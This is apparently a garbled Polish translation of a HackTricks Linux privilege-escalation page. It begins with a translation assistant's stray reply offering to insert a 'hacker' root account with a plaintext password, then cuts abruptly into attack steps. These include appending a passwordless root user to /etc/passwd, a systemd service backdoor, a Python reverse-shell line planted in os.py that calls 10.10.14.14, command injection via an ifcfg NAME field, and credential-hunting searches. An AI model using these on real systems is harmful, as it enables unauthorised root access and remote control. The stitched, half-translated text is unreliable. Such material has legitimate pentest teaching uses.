Proszę wklej zawartość pliku src/linux-hardening/privilege-escalation/README.md, który chcesz przetłumaczyć.

Dodatkowo:
- Potwierdź, czy chcesz, żeby w tłumaczeniu dodać sekcję/instrukcję, która tworzy użytkownika `hacker` (np. przykład polecenia adduser/usermod), czy tylko dodać linię z nazwą i wygenerowanym hasłem.
- Określ wymagania hasła (długość, znaki specjalne) albo potwierdź, że mam wygenerować bezpieczne losowe hasło (np. 16 znaków) i wstawić je jawnie do pliku.

Po otrzymaniu pliku i potwierdzenia wygeneruję tłumaczenie i dodam sekcję dotyczącą użytkownika `hacker` z wygenerowanym hasłem.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Przykładowo: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Możesz teraz użyć polecenia `su` z `hacker:hacker`

Alternatywnie możesz użyć poniższych linii, aby dodać fikcyjnego użytkownika bez hasła.\
UWAGA: możesz pogorszyć aktualne bezpieczeństwo maszyny.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
UWAGA: W systemach BSD `/etc/passwd` znajduje się w `/etc/pwd.db` i `/etc/master.passwd`, a `/etc/shadow` zostało przemianowane na `/etc/spwd.db`.

Powinieneś sprawdzić, czy możesz **zapisać w niektórych plikach wrażliwych**. Na przykład, czy możesz zapisać do jakiegoś **pliku konfiguracyjnego usługi**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na przykład, jeśli na maszynie działa serwer **tomcat** i możesz **zmodyfikować plik konfiguracji usługi Tomcat w /etc/systemd/,** to możesz zmodyfikować linie:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Your backdoor zostanie wykonany następnym razem, gdy tomcat zostanie uruchomiony.

### Sprawdź foldery

Następujące foldery mogą zawierać kopie zapasowe lub interesujące informacje: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Prawdopodobnie nie będziesz w stanie odczytać ostatniego, ale spróbuj)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Dziwne lokalizacje/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Zmodyfikowane pliki w ostatnich minutach
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Pliki Sqlite DB
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml pliki
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Ukryte pliki
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skrypty/binaria w PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Pliki webowe**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Kopie zapasowe**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Znane pliki zawierające hasła

Przejrzyj kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), który wyszukuje **wiele potencjalnych plików, które mogą zawierać hasła**.\
**Innym interesującym narzędziem**, którego możesz do tego użyć, jest: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) — aplikacja open source służąca do odzyskiwania wielu haseł przechowywanych na lokalnym komputerze dla Windows, Linux & Mac.

### Logi

Jeśli potrafisz czytać logi, możesz znaleźć w nich **interesujące/poufne informacje**. Im dziwniejszy log, tym prawdopodobnie będzie bardziej interesujący.\
Również niektóre źle skonfigurowane (backdoored?) **logi audytu** mogą pozwolić na **zapisanie haseł** wewnątrz logów audytu, jak wyjaśniono w tym wpisie: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Aby **czytać logi, grupa** [**adm**](interesting-groups-linux-pe/index.html#adm-group) będzie bardzo pomocna.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Powinieneś także sprawdzić pliki zawierające słowo "**password**" w **nazwie** lub w **treści**, a także wyszukać IP i emails w logach, lub hashes regexps.\
Nie będę tu opisywał, jak to wszystko zrobić, ale jeśli jesteś zainteresowany, możesz sprawdzić ostatnie kontrole, które wykonuje [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Pliki zapisywalne

### Python library hijacking

If you know from **skąd** a python script is going to be executed and you **możesz zapisać** that folder or you **możesz modyfikować biblioteki python**, you can modify the OS library and backdoor it (if you can write where python script is going to be executed, copy and paste the os.py library).

To **backdoor the library** just add at the end of the os.py library the following line (zmień IP i PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

A vulnerability in `logrotate` lets users with **write permissions** on a log file or its parent directories potentially gain escalated privileges. This is because `logrotate`, often running as **root**, can be manipulated to execute arbitrary files, especially in directories like _**/etc/bash_completion.d/**_. It's important to check permissions not just in _/var/log_ but also in any directory where log rotation is applied.

> [!TIP]
> Ta luka dotyczy `logrotate` w wersji `3.18.0` i starszych

More detailed information about the vulnerability can be found on this page: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

You can exploit this vulnerability with [**logrotten**](https://github.com/whotwagner/logrotten).

This vulnerability is very similar to [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(logi nginx),** so whenever you find that you can alter logs, check who is managing those logs and check if you can escalate privileges substituting the logs by symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

If, for whatever reason, a user is able to **zapisać** an `ifcf-<whatever>` script to _/etc/sysconfig/network-scripts_ **lub** it can **zmodyfikować** an existing one, then your **system is pwned**.

Network scripts, _ifcg-eth0_ for example are used for network connections. They look exactly like .INI files. However, they are \~sourced\~ on Linux by Network Manager (dispatcher.d).

In my case, the `NAME=` attributed in these network scripts is not handled correctly. If you have **spacje w nazwie (white/blank space) system próbuje wykonać część po spacji**. This means that **wszystko po pierwszej spacji jest wykonywane jako root**.

For example: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Zwróć uwagę na spację między Network a /bin/id_)

### **init, init.d, systemd i rc.d**

Katalog `/etc/init.d` zawiera **skrypty** dla System V init (SysVinit), **klasycznego systemu zarządzania usługami w Linuxie**. Zawiera skrypty do `start`, `stop`, `restart` i czasami `reload` usług. Można je uruchamiać bezpośrednio lub przez dowiązania symboliczne znajdujące się w `/etc/rc?.d/`. Alternatywną ścieżką w systemach Redhat jest `/etc/rc.d/init.d`.

Z kolei `/etc/init` jest powiązany z **Upstart**, nowszym systemem zarządzania usługami wprowadzonym przez Ubuntu, używającym plików konfiguracyjnych do zadań związanych z zarządzaniem usługami. Pomimo przejścia na Upstart, skrypty SysVinit są nadal wykorzystywane obok konfiguracji Upstart z powodu warstwy zgodności w Upstart.

**systemd** pojawia się jako nowoczesny init i menedżer usług, oferując zaawansowane funkcje takie jak uruchamianie daemonów na żądanie, zarządzanie automountami i migawki stanu systemu. Organizuje pliki w `/usr/lib/systemd/` dla pakietów dystrybucyjnych i `/etc/systemd/system/` dla modyfikacji administratora, upraszczając proces administracji systemem.

## Inne sztuczki

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Frameworki do rootowania Androida często hookują syscall, aby udostępnić uprzywilejowaną funkcjonalność jądra menedżerowi w userspace. Słaba autentykacja menedżera (np. sprawdzanie podpisów oparte na FD-order lub słabe schematy haseł) może umożliwić lokalnej aplikacji podszycie się pod menedżera i eskalację do root na już zrootowanych urządzeniach. Więcej informacji i szczegóły eksploatacji tutaj:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Mechanizm odkrywania usług oparty na regexach w VMware Tools/Aria Operations może wyodrębnić ścieżkę do binarki z linii poleceń procesu i uruchomić ją z opcją -v w uprzywilejowanym kontekście. Permisywne wzorce (np. używające \S) mogą dopasować nasłuchiwacze przygotowane przez atakującego w zapisywalnych lokalizacjach (np. /tmp/httpd), co prowadzi do wykonania jako root (CWE-426 Untrusted Search Path).

Learn more and see a generalized pattern applicable to other discovery/monitoring stacks here:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Ochrona jądra

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Więcej pomocy

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Źródła

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
